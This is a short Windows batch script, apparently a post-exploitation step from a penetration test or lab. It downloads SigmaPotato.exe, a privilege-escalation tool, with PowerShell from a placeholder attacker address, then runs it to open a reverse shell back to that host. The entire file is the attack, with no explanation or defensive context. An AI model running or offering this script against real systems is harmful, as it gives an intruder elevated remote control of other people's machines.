@echo off
powershell -Command "Invoke-WebRequest -Uri https://ATTACKER_IP/SigmaPotato.exe -OutFile SigmaPotato.exe"
SigmaPotato.exe --revshell ATTACKER_IP PORT
